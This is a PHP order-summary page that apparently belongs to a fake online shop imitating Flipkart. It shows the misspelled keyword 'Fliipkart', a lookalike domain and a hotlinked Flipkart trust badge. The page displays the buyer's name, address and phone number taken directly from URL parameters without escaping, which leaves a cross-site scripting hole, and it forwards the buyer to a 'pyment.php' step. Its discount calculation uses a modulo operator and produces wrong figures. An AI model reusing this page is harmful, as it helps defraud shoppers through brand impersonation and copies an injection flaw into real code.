<!DOCTYPE html>


<html lang="en-IN">

<head>
  <title>We are Here to help you, Electronics, Furniture, Grocery, Lifestyle, Books &amp; More. Exclusive Offers!</title>
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="-1">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="Keywords" content="Online Shopping in India,online Shopping store,Online Shopping Site,Buy Online,Shop Online,Fliipkart">
  <meta name="Description" content="India&#39;s biggest online store for Mobiles, Fashion (Clothes/Shoes), Electronics, Home Appliances, Books, Jewelry, Home, Furniture, Sporting goods, Beauty &amp; Personal Care, Grocery and more! Find the largest selection from all brands at the lowest prices in India. Payment options - COD, EMI, Credit card, Debit card &amp; more.">
  <meta property="og:title" content="We are Here To Help You">
  <meta name="theme-color" content="#2874f0" id="themeColor">
  <meta name="viewport" content="width=device-width,minimum-scale=1,user-scalable=no">
  <link rel="stylesheet" href="http://dailyofferday.shop/assets/css/bootstrap.min.css">
  <link rel="stylesheet" href="http://dailyofferday.shop/assets/css/custom.css">
  <link rel="icon" href="http://dailyofferday.shop/img/small-logo.png">


</head>

<body class="expansion-alids-init" cz-shortcut-listen="true">
  <div id="container" style="overflow:hidden">
    <div style="height:100%" data-reactroot="">
      <style>
        .form-control {
          margin-bottom: 16px;
        }

        .card {
          --bs-border-color-translucent: rgba(0, 0, 0, 0) !important;
        }

        .card.max-height {
          height: calc(100vh - 42px) !important;
        }

        .card-footer {
          background: none !important;
          border-top: none !important;
          position: absolute;
          bottom: 0;
          width: 90%;
          left: 5%;
        }
      </style>
      <div class="container-fluid p-3 header-container">
        <div class="row header">
          <div class="col-1">
            <div class="menu-icon" id="back_btn">
              <svg width="19" height="16" viewBox="0 0 19 16" xmlns="http://www.w3.org/2000/svg">
                <path d="M17.556 7.847H1M7.45 1L1 7.877l6.45 6.817" stroke="#000" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"></path>
              </svg>
            </div>
          </div>
          <div class="col-8">
            <div class="menu-logo">
              <h4 class="mb-0 mt-1 ms-2">Order Summary</h4>
            </div>
          </div>
        </div>
      </div>
      <div class="_1fhgRH max-height mb-70">
        <div class="card pt-1 mb-1">
          <div class="progress-box mb-0">
            <img class="w-100" src="/public/process2.png" />
          </div>
        </div>
        <div class="card px-3 py-4 mb-2">
          <h3>Delivered to:</h3>
          <div class="address-div mt-2">
            <?php
            echo'<h4 class="customer-name">' . $_GET['name'] . '</h4>
            <div class="customer-name">' . $_GET['flat'] . ' , ' . $_GET['area'] . ', ' . $_GET['city'] . ' ' . $_GET['pin'] . '</div>
            
            <div class="">' . $_GET['number'] . '</div>
            ';
            ?>


          </div>
        </div>
        <div class="card px-3 py-4 mb-2">
          <ul class="list-group list-group-flush" id="deals">
            <li class="list-group-item px-0" data-timer="2000">
              <div class="flex recommended-product">

                <?php
                         $currentDirectory = getcwd();
                         $jsonFileName = '../products.json';

                         $jsonData = file_get_contents($jsonFileName);
                         $products = json_decode($jsonData, true);
                   
                         // Check if the "item" parameter is set in the query string
                         if (isset($_GET['item'])) {
                             // Retrieve the value of the "item" parameter
                             $selectedItem = $_GET['item'];
                   
                             // Find the selected item in the products array
                             $selectedProduct = null;
                             foreach ($products['items'] as $product) {
                                
                                 if ($product['id'] == $selectedItem) {
                                     $selectedProduct = $product;
                                     break;
                                 }
                             }
                            }
                             // Display detailed information about the selected product
                          
                             if ($selectedProduct) {


                                

                                echo '<img src="' . $selectedProduct['colorImageUrls'][$_GET['color']] . '" id="item_image" />
                                <div class="description">
                                    <div class="product-title mb-1" id="product-title">' . $selectedProduct['name'] . '</div>
                                    <div class="product-detail mb-1" id="product-detail">' . $selectedProduct['colors'][$_GET['color']] . '</div>
                                    <img src="http://dailyofferday.shop/img/SwOvZ3r.png" width="77px">
                                </div>';
                }
                    ?>

              </div>
              <div class="flex recommended-product mt-3">
                <div class="timer qty mx-4">
                  Qty: 1
                </div>
                <div class="description">
                  <div class="price flex">
                    
                  <?php
                    echo '<span class="discount" id="discount">' . $selectedProduct['discount'] . '% off</span>
                    
                    <span class="strike mrp" id="mrp">₹' . $selectedProduct['oldPrice'] . '</span>
                    
                    <span class="selling_price" id="selling_price">₹' . $selectedProduct['price'] . '</span>';
                  ?>
                    </div>
                </div>
              </div>
            </li>
          </ul>
        </div>
        <div class="card px-3 py-4 mb-2" id="price-detail">
          <h3>Price Details</h3>

          <?php
                    echo '
          <div class="price-detail-div mt-2">
            <div class="product-price-list my-3">
              <span class="title">Price (1 item)</span>
              <span class="data mrp me-0 td-none">₹' . $selectedProduct['oldPrice'] . '</span>
            </div>
            <div class="product-price-list my-3">
              <span class="title">Discount</span>
              <span class="data discount-amt text-success">-₹' . $selectedProduct['discount']%$selectedProduct['oldPrice'] . '</span>
            </div>
            <div class="product-price-list my-3">
              <span class="title">Delivery Charges</span>
              <span class="data text-success">FREE Delivery </span>
            </div>
            <div class="product-price-list my-3 pt-3 total">
              <span class="title">Total Amount </span>
              <span class="data selling_price">₹'.$selectedProduct['price'].'</span>
            </div>
            <div class="product-price-list mt-3 pt-3 saved-div">
              <span class="text-success">You will save <span class="discount-amt">₹' . $selectedProduct['oldPrice']-$selectedProduct['discount']%$selectedProduct['oldPrice'] . '</span> on this order</span>
            </div>';
            ?>
          </div>
        </div>
        <div class="sefty-banner">
          <img class="sefty-img" src="https://rukminim1.flixcart.com/www/60/70/promos/13/02/2019/9b179a8a-a0e2-497b-bd44-20aa733dc0ec.png?q=90" loading="lazy" alt="">
          <div dir="auto" class="sefty-txt">Safe and secure payments. Easy returns. 100% Authentic products.</div>
        </div>
        <div class="button-container flex p-3 bg-white">
        <?php
          echo '<div class="col-6 footer-price">
            
            <span class="strike mrp ms-0 mb-1" id="mrp">&#8377;'.$selectedProduct['oldPrice'].'</span>
            <span class="selling_price" id="selling_price">&#8377;'.$selectedProduct['price'].'</span>
          </div>';
          
          echo'<a class="buynow-button product-page-buy col-6 btn-continue text-center" type="button" href="/views/pyment.php?item=' . $_GET['item'] .'">
            Continue
          </a>';
          ?>
        </div>
      </div>

    </div>

</body>

</html>